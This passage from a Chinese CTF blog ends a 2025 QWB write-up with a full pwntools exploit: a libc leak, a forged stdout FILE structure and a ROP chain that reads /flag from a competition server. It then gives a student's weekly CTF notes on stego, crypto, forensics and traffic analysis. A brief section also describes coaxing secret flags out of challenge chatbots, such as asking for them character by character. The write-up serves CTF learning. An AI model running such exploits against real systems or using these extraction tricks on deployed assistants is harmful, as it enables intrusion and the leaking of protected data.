up，后面没再调了，一直调不出来\u0026hellip;\u0026hellip;\n泄露libc基地址 通过输入函数触发内存泄露，获取 libc 中free 函数的指针，scanf %s 泄露libc地址：\n1 2 3 4 # 从泄露的数据中提取free函数指针（减去偏移126修正） free_function_pointer_address = u64(io.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 126 # 用free函数在libc中的偏移计算基地址 libc_base = free_function_pointer_address - libc.sym[\u0026#34;free\u0026#34;] 伪造IO结构 add函数分析：\nadd 处可导致任意地址写一字节0 ，修改stdin结构体可以实现任意地址写，修改stdout结构体，puts触发io ：\n起初想用ORW的，但看到seccomp的一些限制，无法直接获取 shell，因此我尝试采用伪造 IO 流结构体的方式控制程序流程。\n利用堆操作将伪造的_IO_FILE结构体写入内存、劫持标准输出流（_IO_2_1_stdout_）\n构造的伪造结构体包含setcontext相关 gadget ，然后跳转到 ROP 攻击链：\n1 2 3 4 5 6 7 8 # 伪造文件结构体地址（基于stdout地址） fake_file_structure_address = libc.sym[\u0026#39;_IO_2_1_stdout_\u0026#39;] + libc_base # 构造控制IO流的payload1 payload1 = ( p64(0x0) + b\u0026#39;\\x00\u0026#39; * 0x10 + p64(libc.sym[\u0026#39;setcontext\u0026#39;] + 61 + libc_base) + # 跳转 ... # 略 ) 构造ROP攻击链 通过伪造的 IO 结构体触发 ROP 链，完成文件操作。\n1、打开 Flag 文件：使用open系统调用打开/flag（文件路径存储在 ROP 链末尾）。\n2、读取文件内容：将 Flag 内容读取到IO_2_1_stdout + 0x300处（libc 中的可控内存）。\n3、拿到flag：通过write系统调用将读取到的内容输出到标准输出。\nROP链：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 payload_ROP = ( # 打开/flag（只读模式） p64(pop_rdi) + p64(libc_base + 0x204698) + # 文件名地址 p64(pop_rsi) + p64(0) + # 只读模式 p64(libc_base + libc.sym[\u0026#39;open\u0026#39;]) + # 读取内容到内存 p64(pop_rdi) + p64(3) + # 文件描述符（假设为3） p64(pop_rsi) + p64(libc_base + 0x300 + libc.sym[\u0026#39;_IO_2_1_stdout_\u0026#39;]) + # 存储地址 p64(pop_rdx) + p64(0x30) + # 读取长度 p64(libc_base + libc.sym[\u0026#39;read\u0026#39;]) + # 输出Flag p64(pop_rdi) + p64(1) + # 标准输出 p64(pop_rsi) + p64(libc_base + 0x300 + libc.sym[\u0026#39;_IO_2_1_stdout_\u0026#39;]) + # 内容地址 p64(pop_rdx) + p64(0x30) + # 输出长度 p64(libc_base + libc.sym[\u0026#39;write\u0026#39;]) + b\u0026#39;/flag\\x00\u0026#39; # 文件名 ) 小结 一开始傻乎乎用本地libc打PWN，打半天没通，还有些函数找不到，这次用了 libc.so.6\nexp、flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from pwn import * io = remote(\u0026#39;39.106.46.67\u0026#39;,26641) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) io.sendafter(b\u0026#39;:\u0026#39;, b\u0026#39;a\u0026#39; * (0x28 - 4) + b\u0026#39;stop\u0026#39;) io.recvuntil(b\u0026#39;stop\u0026#39;) free_function_pointer_address = u64(io.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 126 libc_base = free_function_pointer_address - libc.sym[\u0026#34;free\u0026#34;] io.sendlineafter(b\u0026#39;:\u0026#39;, \u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;:\u0026#39;, str(libc_base + 0x203918 + 1)) io.sendafter(b\u0026#39;:\u0026#39;, b\u0026#39;a\u0026#39;) io.send( b\u0026#39;a\u0026#39; * 0x18 + p64(libc_base + libc.sym[\u0026#39;_IO_2_1_stdout_\u0026#39;]) + p64(libc_base + libc.sym[\u0026#39;_IO_2_1_stdout_\u0026#39;] + 0x200) ) fake_file_structure_address = libc.sym[\u0026#39;_IO_2_1_stdout_\u0026#39;] + libc_base pop_rdi_gadget_addr = libc_base + 0x000000000010f78b pop_rsi_gadget_addr = libc_base + 0x0000000000110a7d #pop rdx ; xor rax; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret pop_rdx_gadget_addr = libc_base + 0x00000000000b503c sleep(5) payload1 = ( p64(0x0) + b\u0026#39;\\x00\u0026#39; * 0x10 + p64(libc.sym[\u0026#39;setcontext\u0026#39;] + 61 + libc_base) + p64(fake_file_structure_address) + b\u0026#39;\\x00\u0026#39; * 0x40 + p64(fake_file_structure_address) + p64(0x0) + p64(fake_file_structure_address) + b\u0026#39;\\x00\u0026#39; * 0x8 + p64(fake_file_structure_address + 0x8) + p64(0x400) + p64(0x23) + p64(fake_file_structure_address) + p64(libc.sym[\u0026#39;setcontext\u0026#39;] + 294 + libc_base) + p64(libc.sym[\u0026#39;read\u0026#39;] + libc_base) + b\u0026#39;\\x00\u0026#39; * 0x20 + p64(libc.sym[\u0026#39;_IO_wfile_jumps\u0026#39;] + 0x10 + libc_base) + p64(fake_file_structure_address) ) io.send(payload1) sleep(5) payload_ROP = ( p64(pop_rdi_gadget_addr) + p64(libc_base + 0x204698) + p64(pop_rsi_gadget_addr) + p64(0x0) + p64(libc_base + libc.sym[\u0026#39;open\u0026#39;]) + p64(pop_rdi_gadget_addr) + p64(0x3) + p64(pop_rsi_gadget_addr) + p64(libc_base + libc.sym[\u0026#39;_IO_2_1_stdout_\u0026#39;] + 0x300) + p64(pop_rdx_gadget_addr) + p64(0x30) * 5 + p64(libc_base + libc.sym[\u0026#39;read\u0026#39;]) + p64(pop_rdi_gadget_addr) + p64(0x1) + p64(pop_rsi_gadget_addr) + p64(libc_base + libc.sym[\u0026#39;_IO_2_1_stdout_\u0026#39;] + 0x300) + p64(pop_rdx_gadget_addr) + p64(0x30) * 5 + p64(libc_base + libc.sym[\u0026#39;write\u0026#39;]) + b\u0026#39;/flag\\x00\u0026#39; ) io.sendline(payload_ROP) io.interactive() 结尾 这就是我们GoblinSEC小队的WP，欢迎其它师傅一起交流\n","date":"2025-10-20T00:00:00Z","headings":[{"id":"前言","level":2,"text":"前言\n"},{"id":"misc","level":2,"text":"MISC\n"},{"id":"crypto","level":2,"text":"Crypto\n"},{"id":"web","level":2,"text":"Web\n"},{"id":"reverse","level":2,"text":"Reverse\n"},{"id":"pwn","level":2,"text":"PWN\n"},{"id":"结尾","level":2,"text":"结尾\n"},{"id":"签到","level":3,"text":"签到\n"},{"id":"personal-vault","level":3,"text":"Personal Vault\n"},{"id":"问卷调查","level":3,"text":"问卷调查\n"},{"id":"legacyoled","level":3,"text":"legacyOLED\n"},{"id":"谍影重重60","level":3,"text":"谍影重重6.0\n"},{"id":"the_interrogation_room","level":3,"text":"The_Interrogation_Room\n"},{"id":"check-little","level":3,"text":"check-little\n"},{"id":"secretvault","level":3,"text":"SecretVault\n"},{"id":"bbtv","level":3,"text":"bbtv\n"},{"id":"yamcs","level":3,"text":"yamcs\n"},{"id":"anime","level":3,"text":"anime\n"},{"id":"butterfly","level":3,"text":"butterfly\n"},{"id":"flag-market","level":3,"text":"flag-market\n"},{"id":"bph","level":3,"text":"bph\n"}],"image":"https://expl0rer.top/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/QWB-logo_hu_c67de2ae9383b70e.png","permalink":"https://expl0rer.top/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/","title":"2025强网杯"},{"content":"[TOC]\n作者先前入门CTF周报回忆录，有部分题目缺失，希望此WP能帮助到你。\n2024.9-10 西电-moectf2024 MISC signin:在看了题目背景后起初并无思路，我通过看右边注释安装了“WSRX国内镜像”，启动了在线环境，发现下方出现wsxl，点击复制后，将其粘贴在WSRX国内镜像（如图1），发现它给我转出了一个类似IP地址的号码（如图2），根据题意再将它通过搜索引擎搜索出一个考勤页面，最后依题完成任务得出flag。这题主要重在审题，难度于我不大罗小黑战记：第一次看到是一个表情包，发现它会很短时间跳出一张二维码，我手机扫不到，但我知道我需要将这段动画过程变慢或者暂停，然后通过WSDN提示，得知misc部分工具的功能。我使用puzzlesolve的imagetool功能将小黑分解（如图3），得出了其中二维码。重在观察及工具的运用，难度于我不大*杂项入门指北：打开图片后观察右边的竖线有不同之处\u0026ndash;摩斯密码，翻译即可。*Abnormallap:审题听歌头尾部分确实有卡顿，我开始在音频工具audacity分析这首mav格式的歌，我试着切换它的频谱图，观察发现全图头尾有不同之处（如图3），试着将其拉长得到（图4）一段字符，又根据题目提示moectf{[\\da-f-]+}(通过chatgpt解读)阿拉伯数字+小写字母(a-f)以及连字符\u0026quot;-\u0026quot;，即可知道flag。本题重在观察和工具的使用。somany\u0026rsquo;m\u0026rsquo;:这题是让我最抓狂的一题，它没有二进制、十六进制的格式。它有@{}！这些base64、base32所没有的符号，这我只能在puzzlesolve上其它相关工具尝试，最后在frequencycount工具上测出频率排序得到所谓的答案（如图5），没曾想被坑了，再回题干看到题目提示“如果有某几个字符无法判断顺序请按字典序排序”，这才知道（如图6）出现排序问题，P和M倒过来才正确。本题重在观察乱码格式来排除可能，来减少自己寻找工具的麻烦，其次是细心。Find_it:审题+大西安+雄峰+高德地图+幼儿园。重在搜索。*ctfer2077-3：（流量分析）Wireshark和WinHex的配合使用依据我们可以初步得知这段所需流量和http协议有关，我们可以利用wireshark的流量分析功能进行提取，利用它的过滤，筛选出两段流量（如图7），可以发现第一条流量有”upload“，我就选取这段，右键它并选取tcp追踪流，然后提取到（图8），往下滑发现（图9）蓝色字体“secret_zip”初步确定这是个压缩包，我在（图10）发现了504B文件头——压缩包，接下来我通过搜索引擎得知“Hypeertext\u0026hellip;.”是个装有这段流量信息的地方（图11），右键导出分组字节流，另存成bin类型的文件，接下来将其移至winhex工具中查看其16进制，其中不难发现（图12）有504B的文件头在其中，而开头的是不需要的，所以删除504B前面的码。由之前的tcp追踪流（图13）可知，这后面的蓝色字体部分是响应内容，这是需要删除的，图9中画圈中可知那是红色内容的结束部分，通过这里找到文件尾，来到winhex中将响应内容16进制部分（图14）删去。最后将修改后文件保存为zip类型文件即可打开了。\n大数据模型应用安全 Neuro：通过多次交流关注到“亲口说”、“Vedal：。。。”（如图1），进而从AI那套出flag。并非助手：并非助手：因为不能输入ASCIIPrintable所以直接输出旗帜后flag就出来了。不能出现flag英文就可以。\nEvil?:让它把flag的一个一个字符说出来就可以。\nWeb 一、初步认识了爬虫协议——****/robots.txt二、学会通过用搜索引擎查看ctf题目的源代码、简单抓包(例如西电ctf的“弗拉格之地的挑战”\nPwn 一、初步会用浏览器搓脚本(如西电ctf的NotEnoughtime)然后应用到题目中\n待做事项 一、看看sql注入和密码学原理的解题思路；找下御网杯ctf、西电ctf的wp周报和题；\n二、pwn的部分题目需写代码，自己不熟悉python的脚本代码，因此后面需要更多地学习python语言及其脚本编写；\n三、web和pwn题目有点难，做起来没有思路，参考别人的wp也不是很懂，接下来我应该多去学习这类题目的解法和知识点。\n学习知识分享 kali虚拟机自带nc，所以有网址要用nc链接的话，主机不用下nc了；helloctf_os、kali虚拟机有很多解ctf的工具，所以建议大家直接下载helloctf_os、kali的虚拟机吧。\n这是我攒了很久的ctf资源，大家可以看看，像文件头有必要记一记，以及”吾爱破解“这个网站有很多汉 化后的ctf工具。各类ctf网站的wp网址等等：\n更多逆天资源.doc\n2024.11.4 Buuctf练习场 题目来自BBUCTF练习场：BUUCTF在线评测\u0026mdash;以下题目是本人觉得有代表性的。\nMISC 你竟然赶我走 这题给了个静态jpg图片，第一时间想到隐写，放到winhex里分析，在最后看到这个flag：\n但这不是好方法，费时间去观察，我们可以直接将这张图片拉到随波逐流里帮我们分析：\n最快得到flag。\n二维码 看到二维码先扫一扫，然后放到CQR、随波逐流上分析，发现只看到sectet is here的英文，交上去是错的，事情不简单，这个是隐写，直接飞到kali上使用binwalk看看藏了什么：\n藏了flag。\n然后我就用刚学的foremost指令进行将这txt抽离：\n抽离出加密压缩包，接着爆破就可以了。\n大白 开局给了这个：\n一开始是半身的，想到要恢复比例，可以用随波逐流，随波逐流这个工具可以检测图片原本尺寸并进行修复：进而得到flag。\nwireshark 原题是“黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案) 注意：得到的 flag 请包上 flag{} 提交”\n登录\u0026ndash;login、post。\n先说说post请求吧：是HTTP协议中的一种请求方法，它用于将客户端数据发送到服务器。在Web开发中，POST请求通常用于提交表单数据或上传文件。与GET请求不同，POST请求的数据不会出现在URL中，而是包含在请求体中，这使得POST请求可以发送更大量的数据，并且相对于GET请求来说，具有更高的隐私性。例如，一个发送JSON数据的POST请求可能如下所示：\n1 2 3 4 5 6 7 8 9 10 OST /api/user HTTP/1.1 Host: example.com Content-Type: application/json Content-Length: 123 { \u0026#34;name\u0026#34;: \u0026#34;John Doe\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;johndoe@example.com\u0026#34;, \u0026#34;age\u0026#34;: 30 } 其实有post请求出现也经常会伴随user、HTTP、api这些关键词。\n接下回到题目，将流量包放入wireshark工具中分析，用http或者tcp过滤，去找有post请求的一段流量：\n类似这样的流量分析还有“被嗅探的流量”。\nzip伪加密 题目没有任何提示，ziperello破了半天没破成功，随波逐流分析上分析不出来，多半是伪加密了，重点来了！！！！:\n第一个504B所在的行如果出现09多半是伪加密了，而我们只需要将第二个504B的09改成00就可以了。类似的还有“rar”。\nLSB kali的binwalk和foremost指令分离不出有用的东西，随波逐流分析不出，看到题目的LSB有特殊含义，去查了查得知这是lsb隐写，现在我们要用stegsolve工具进行分析：\n进行数据分析后得出：\n我们看到了有png在其中，将其导出为png形式的文件可知是个二维码。\n隐藏的钥匙 和之前的隐写相比，这次的隐藏隐秘写，在winhex工具中分析16进制时，头和尾部未出现flag，这时我们可以用到winhex的搜索功能：\n我也没想到有这功能，搜索出来的flag在ANSI ASCLII码的中前段，然后解码即可得到。\n数据包中的线索 本题主要是识别base码，base64包含的元素有：小写字母a-z、大写字母A-Z、数字0-9、符号\u0026quot;+\u0026quot;、\u0026quot;/\u0026ldquo;一共64个字符的字符集。\n假如给我三天光明 这张图片下方有”点“，查了下发现这是盲文，翻译过来是：“kmdonowg”，将其作为密码去解压提取附加的文件时得到一个wav，它听起来是摩斯密码，用audacity工具去分析音频最后得到flag：\n2024.11.9 Buuctf-MISC、Crypto MISC 神奇的二维码 base64多重编码：这个是题目\n扫进去信息没用，放到010editor也无，那就是隐写了。用kali的binwalk和foremost指令去分离，果真有：\n一个全是base64进制码的word文档，还有一个rar加密压缩包，起初想用随波逐流去解码的，没想到超字数了。只能用另外一个新工具：CyperChef。将密文复制到上面进行解码。\n然后我发现这个是翻译密文的字数上限是比随波逐流工具要高的，而且这个密文还是多重加密，我翻译了快二十次才出结果。接着用这个密码打开rar加密包，发现里面的MP3是摩斯密码，将它拖到audacity进行分析就可以得到flag了。\n荷兰宽带数据泄露 开局直接发我一个二进制bin文件，给随波逐流、010editor分析却没啥有效信息，根据题目所示，提及有关“数据”之类，这时我们需要用到一个工具：routerpassview\nRouterPassView：大多数现代路由器允许您备份到一个文件路由器的配置，然后从文件中恢复配置时的需要。路由器的备份文件通常包含了像您的ISP的用户名重要数据/密码，路由器的登录密码，无线网络的关键。如果你失去了这些密码1 /钥匙，但你仍然有你的路由器配置的备份文件，RouterPassView可以帮助你从你的路由器恢复您丢失密码的文件。\n用routerpassview的查找功能找像username、password、flag等关键词，一个个尝试提交看看。\nCrypto 所需工具：随波逐流v6.3，RSAtools、(因式分解)yafu-x64\n重点：需要记住凯撒密码、rabbit密码、栅栏密码，这三类是很难从外表辨别出的，放到随波逐流工具看看有没有flag\n解密 将密文粘贴至随波逐流解码工具中，就可以得出flag，这个工具能将大部分密码格式罗列出来，如凯撒密码、base64、base32、栅栏密码等。\nMD5加密 e00cf25ad42683b3df678c61f42c6bda\n这个是md5加密形式，格式一般有字母和数字组成，最重要的是长度为32位，自己可以数数。。。\n使用MD5解码工具得到：admin1，这就是flag。\nURl加密 %66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d\n这个是url加密，用专门的解密工具就可以得到flag，如随波逐流，密文格式一般是两位字符串组成一组，再由%来隔开。\nrot加密 密码在图上边，题目提示是回旋踢，意味着有”回转“，就是重新绕回，这就是rot加密，用工具解码，rot表回转，后面的数字表示偏移位数，比如说s，从s开始到i-j-k，就偏了3次，到z后又回到a，直至到f，刚好13，所以说Rot13解码就是真正的flag。\n凯撒密码 afZ_r9VYfScOeO_UL^RWUc\n这个就是凯撒密文了，这种我认为是最恶心的密文了，看不出规律，只能放在随波逐流上看有没有flag在里面，\n凯撒密码的变化大致是把原文的字母移动一定的位数来实现加密或者解密，比如从A、D开始偏移三位，分别变成D、G了。\nquoted-printable加密 =E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6\n这类密文形式很明显，有等号、大写字母和数字，交给随波逐流吧。\n栅栏加密 felhaagv{ewtehtehfilnakgw}\n这个就很好看了，在网络空间安全导论课上有听到老师将这个栅栏加密，大致是：解密者需要掌握栅栏的排列顺序和每个栏的宽度，然后按照加密过程的逆序逐个提取出明文信息。 这种加密方式虽然较为简单，但具有较好的隐蔽性和可读性。 在一些特定场合下，例如军事或商业机密等需要保护敏感信息的场合，可以使用栅栏密码来确保信息的安全。\n就13栏符合了。\nRabbit加密 U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI\n这我找不出规律/。。。。只能记了。。\nRSA加密 在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17\n求解出d作为flga提交。\n这里需要用到RSAtools（不建议手算）\n打开这个工具后可以看到，p、q都是素数，d是私钥，而题目给出了pq了，我们输进去就可以，注意这个e填到工具中的E空栏时，有个hex，需要我们把e=17变成16进制的“11”，接着按下calc：D生成私钥就可以，这就是flag了。\nyafu因式分解与哈希加密 题目：密码学历史中，有两位知名的杰出人物，Alice和Bob。他们的爱情经过置换和轮加密也难以混淆，即使是没有身份认证也可以知根知底。就像在数学王国中的素数一样，孤傲又热情。下面是一个大整数:98554799767,请分解为两个素数，分解后，小的放前面，大的放后面，合成一个新的数字，进行md5的32位小写哈希，提交答案。 注意：得到的 flag 请包上 flag{} 提交\n这里要分解素数可以用到yafu，下载好yafu-x64并设置好路径后，在桌面打开终端\n按照题目排列好数字串101999966233后，\n2024.11.16 西电-moectf2024 完成事项 解决f5隐写、磁盘文件的查看、解决txt零宽隐写、西电MOECTF\nMISC ctfer2077-2 这题给的文件有点特殊，电脑没识别出来，但我看了下属性，发现者货大小：4096KB——磁盘内存（2^12，你想想你手机设置里给的最大内存是不是和这有关，都是2的次方？），那就用Veracrypt去分析吧，\n这文件果然被识别出来了，现在要密码？题目已经给了那个那啥社会主义的，用来翻译下? 是p@55w0rd\n然后就此创了个A盘来去打开它，里面还有个txt问我flag在哪，显然还要找，\n用NTFS隐藏数据流分析吧，这专门为磁盘分析准备的，\n还真有，然后我就不会了，后面看了别人wp，发现这是双拼输入法打出来的，flag就是moectf{shuangpinshizheyangdachulaide}，太难了想不出这么诡异的输入法。\nez_F5 开局来一个图片，看到题目给的提示，找了下csdn，发现是个F5隐写，在网上下载好F5-stegraphy-master的工具文件包，用终端指令使用文件来解决隐写：\ncmd\ncd /d F:\\Legion\\xxxx\\xxxx\\F5-steganography-master\njava Extract (图片绝对路径) -p （密码）\n在这张图片的属性界面发现了有备注，那是个base32进制，翻译后得到：no——password的短语，可知这就是f5隐写密码了。\n还真有，然后再f5隐写文件上的output.txt文本上找到了flag：moectf{F5_15_s0_lntere5t1n9}\n小小套娃 给了个winrar7z压缩包，里面有张图片，放入随波逐流中，用binwalk、foremost分离出来，发现有一个txt，里面的开头8950，很明显是个png文件\n内容是：you\u0026rsquo;ve got the zipkey:874jfy37yf37y7，那这个zip密码就是874jfy37yf37y7了，点入nnnext.zip文件发现，里面的next.7z和txt的密码都是874jfy37yf37y7，，而且这个txt内容：\n有个符号很奇怪，查了查这是长度为零的字符，这不就是零宽隐写吗？用puzzlesolver解码得到：dhufhduh48589\n然后用这个dhufhduh48589密码打开另外一个flag.7z文件，查看里面的txt，\n去翻译下新佛曰吧。。。。。得到flag。\n来总结下零宽隐写吧：也就是说txt出现零宽时，有可能看不见，也有可能看见两三个字粘在一个格子上，如：\n零宽空格（zero-width space, ZWSP）用于可能需要换行处。\nUnicode: U+200B HTML:零宽不连字 (zero-width non-joiner，ZWNJ)放在电子文本的两个字符之间，抑制本来会发生的连字，而是以这两个字符原本的字形来绘制；\nUnicode: U+200C HTML:零宽连字（zero-width joiner，ZWJ）是一个控制字符，放在某些需要复杂排版语言（如阿拉伯语、印地语）的两个字符之间，使得这两个本不会发生连字的字符产生了连字效果。\n2024.11.19 西电Newstars-ctf2024 MISC week3 BGM坏了吗？ 上来就给我个音频，我也是听了下，还是我喜欢的歌，听到最后莫名其妙有小小的嘟嘟声，我用audacity进行分析，果不其然在音频后段有：\n把这两声道分离，将上部去掉留下部。\n接着导出mav文件，再听一遍，发现这是拨号声音，但我听不出，我求助csdn，找到了dtmf链接，识别拨号的网址：https://dtmf.netlify.app/\n将文件放入dtmf上，然后得到一串数字，即为flag：2024093020241103\nweek2-热心助人的小明同学 题目：\n链接：https://pan.baidu.com/s/11zaWrYj8s4VicA83GPS3QQ 密码：ns24 开局给我发了个image.raw,看了看题目提示，应该是内存镜像，要用volatility去分析，只要找出小红的电脑登录密码就好，直接上cmd，用volatility指令！查看了下系统信息：\n再列出缓存在内存中的注册表 hivelist：还真有小红！\n列出全部用户名：\n把密码找出来：全是hash（这一步其实可以省略，只不过有些题需要去判断这些hash值对应的明文密码是否是空密码）。。\n最后一步。。。显示明文密码：\n其实做到这里我也很好奇这个上面的H是干嘛用的。这就是密码：ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh\n这道题对我的感受很深，是我学杂项以来觉得比较值得细学的方向，就是取证方向，它是属于刑侦取证分析行业的，每年会举行奇安信盘古石电子取证大赛、美亚杯、龙信杯等取证赛，也是杂项为数不多的一个痛点。\n2024.11.29 西电Newstars-ctf2024 完成事项 数字取证：进一步学会使用volatility分析取证，FTK、EFDD磁盘取证分析，及其各指令的初步掌握。\n分别在在kali、windows系统上成功配置python2.7虚拟环境、安装了volatility的python脚本。\nMISC week4-擅长加密的小明同学 开局给了vhd磁盘文件和raw镜像文件，vhd要密码才能打开。。。\n选第一个，利用镜像文件vhd的镜像raw文件找密码，\nkey：408320-285065-614779-610940-547107-218229-492195-125422，用这个key恢复磁盘。\n玩套娃，里面的7z文件是加密的，还得找密码。现在只能从chal.raw镜像文件去分析了，现在用kali的volatility取证分析，用python2.7版本的kali终端进行volatility指令，查看镜像文件的进程数据\n1 python vol.py -f xxx.raw --profile=Win7SP1x64 pslist 这里只能一个个查看这些文件的类型（用ai搜索）发现这个mspaint.exe是个画图软件，这和题目提示有关，用指令提取这里的进程数据出来。导出进程数据，这里的 ‘PID’是3744：\n1 python vol.py -f xxx.raw --profile=Win7SP1x64 memdump -p \u0026#39;PID\u0026#39; --dump-dir=./ 分离出了dmp文件，可以猜到这是和图片有关的原始文件，这里我们用到GIMP图像编辑器。小提示\n一般正常的内存镜像的话，图像类型我们都选择「RGB 透明」\n适当调大宽高，能显示多一点内容，但别调太高，小心程序崩了\n位移看着拉，先拉到感觉有东西显示的位置，感觉差不多这样吧，一般画图就是白的夹依托的感觉\n调好位移就调宽高，宽和高实际上就是和程序窗口大小有关，所以别太高，主要是宽度，如果和图上一样↘斜，那么你就该调高宽度，箭头一点一点加上去，如果是↗，你就得一点一点减下来，知道看上去正常了，下面是较为正常。\n全小写字母\n压缩包密码：rxnifbeiyomezpplugho，最后得到flag。\n2025.3.29 西电Newstars-ctf2024 MISC取证专题-week4 擅长加密的小明同学 解压君は加密本当に上手だな.zip得到内存镜像chal.raw。\n使用Elcomsoft Forensic Disk Decryptor来解密磁盘镜像Secret.vhd，得到BitLocker恢复密钥为142593-710886-423500-433763-213499-455807-632885-152152。\n输入恢复密钥解锁分区，得到加密的flag.7z压缩包。\n执行python2 vol.py -f chal.raw imageinfo，得到操作系统为Win7SP1x64\n执行python2 vol.py -f chal.raw --profile=Win7SP1x64 pslist\n得到：\n0xfffffa80192c8b00 mspaint.exe 2804 1844 5 121 1 0 2024-10-12 17:31:28 UTC+0000\n可知mspaint.exe进程的PID为2804。\n执行python2 vol.py -f chal.raw --profile=Win7SP1x64 memdump -p 2804 -D ~/Desktop/，得到2804.dmp，将其重命名为2804.dmp.data。\n使用GIMP打开2804.dmp.data，调整参数如下：\n位移：5604782 宽度：1728 高度：1057 垂直翻转就能看到图像：\n可得密码为rxnifbeiyomezpplugho。\n输入密码解压flag.7z，得到flag.txt：\nFlag{5ZCb44Gv5Y+W6K+B5pys5b2T44Gr5LiK5omL}\n故flag{5ZCb44Gv5Y+W6K+B5pys5b2T44Gr5LiK5omL}\n擅长音游的小明同学 在FTK Product Downloads下载 Exterro FTK Imager ，打开chal_fixed.E01。\n观察到C:\\Users\\Administrator\\Desktop\\要开始了哟~.txt内容如下：\n今天舞萌彩框了好开心啊o(￣▽￣)ブ\n我要把这一刻用照片保存下来\n不过在拍摄rating变化的瞬间总感觉有什么东西藏进照片里了\n打开也没发现什么异常，但是体积好像变大了一点\n是错觉吗？\n于是找到C:\\Users\\Administrator\\Pictures\\ColorfulDog.jpg，使用压缩软件打开并解压，得到secret.txt提示：\n听好了听好了听好了听好了听好了听好了听好了：\n1919年8月10日，世界就此陷落，\n陷落的世界都将迎来一场漩涡，\n为这个世界带来有关弗拉格尚未知晓的真相。\n但发掘真相的道路被加诸混沌的历练\n世界的宽高未被正确丈量\n当真相被混沌打乱时\n真相将不复存在\n也许，在世界的重置和轮回中能找到发现真相的方法……\n至此，尘埃落定\n至此，一锤定音\n#音游# #NewStarcaea #Misc\n用十六进制编辑器打开ColorfulDog.jpg，提示我们分辨率为 1280 × 800 。\n用 Exterro FTK Imager 挂载chal_fixed.E01中的分区。 打开Dism++可知系统为 Windows 7 x64 。 在 VMware Workstation 中新建虚拟机，分配虚拟磁盘。 在DiskGenius中打开创建的虚拟磁盘并分区，将挂载的chal_fixed.E01中的系统盘克隆分区到虚拟磁盘中。 将微PE工具箱的 ISO 连接到虚拟机，开机先进入 PE ，使用 Dism++ 进行引导修复。 修复完成后断开 PE 的 ISO 并重启，此时就可以正常启动系统了。 先登录 Guest 用户，修改屏幕分辨率为 1280 × 800 。 再注销，登录 Administrator 用户，即可观察到桌面图标的特定位置 flag{wowgoodfzforensics}\n2025.4 完成事项 有幸参加了广东省卫生健康网络安全技能大赛\n线下赛还是比较紧张，毕竟第一次参加。\n这周主要是复盘线下培训的知识及错题，题做的少，wp可能比较水，然后看了复盘的线上会议，进一步熟悉了wireshark的过滤器运用。\n水了几个QQ群搞到了lovelymem的取证工具，备战盘古石赛。\n稍微理解了下volatility的一些指令：\n未完成事项及原因（后续如何完成） 不是很会蚁剑流量和冰蝎\n？？用小皮搭个网站后，用bp发送请求缺无响应\n下周待做事项 准备盘古石比赛搞点取证题入入手\n2025.4.25 完成事项 打了UCSCctf，还是五味杂陈哈，主要是自己流量分析这块有点弱，然后自己在这周重点复盘流量分析，以下是wp，有一把梭也有手搓。\nUCSCctf-MISC Three-ucsc 根据题目可知，这三个文件的内容组成一个flag值，盲水印。\n水印加密，开局给了jar，我工具箱也有，方法一，常规脚本使用，使用指令java -jar xxx打开 套，提出来了。\n看着模糊，可以用p图调色去变清晰，这里不多解释；\n方法二：一把梭，直接用山羊puzzlesolver梭\n原理一样。\nUSB-ucsc 用wireshark打开这个文件发现是usb流量，可用脚本可用梭。这里直接用NetA去梭：\n这个工具还是很好用的，跟随波逐流差不多的，名字是NETA，上网搜就可，低版本免费，高版本给钱。\nNo.shArk-ucsc 拿到一个流量包，进去除了http，还有dns的，不太对劲。\n过滤dns看到了很多010110的二进制码：\n在这题我卡住了，后面都是别人的wp：\n用脚本或者其他工具梭都可，这段二进制码可以转成图片，就是二维码：\n解释一下原理吧，为什么这里是二进制编码，因为本质信息传输都是以二进制0和1的形式存在的，传到目的地才会有“翻译”给转译成你看得懂的数据，这里流量传输也是一样，一条流量一条的传输，对应在工具就能看到就是一句一句的传，我们刻意把它们拷贝下来一条条的拼回去就是二维码原始数据了，再转移成图片。\n缺失了定位符，自己搓出也很简单的。\nQr扫二维码，看起来是密钥\nY0U_Fi8d_ItHa@aaHH\n接着从http下手，看到HTML\n奇怪的歌。。。。\nsnow隐写本质上其实是html隐写，然后找到一个html文件\n有密钥有html，那就是snow隐写了。\n11ef-b3b6-a4b1c1c5a2d2}\n已经找到后半段，还有前半段\n接着回去看流量：\n有图片，导出，这个应该是像素偏移的题，用gimp不行（gimp的是单轴偏移），这个是两轴偏移（x，y轴十字偏移）\n直接梭 密钥是keykeyishere\n猫脸变换脚本都有的\n变换出货！！！！flag完毕\n小套不是套-ucsc 看到套.zip里面有好多白bin文件，而且用winrar打开查看，字节大小出奇一样！\n判断出这是CRC校验碰撞，字节为4 。\n找到一个密钥 SecretIsY0u 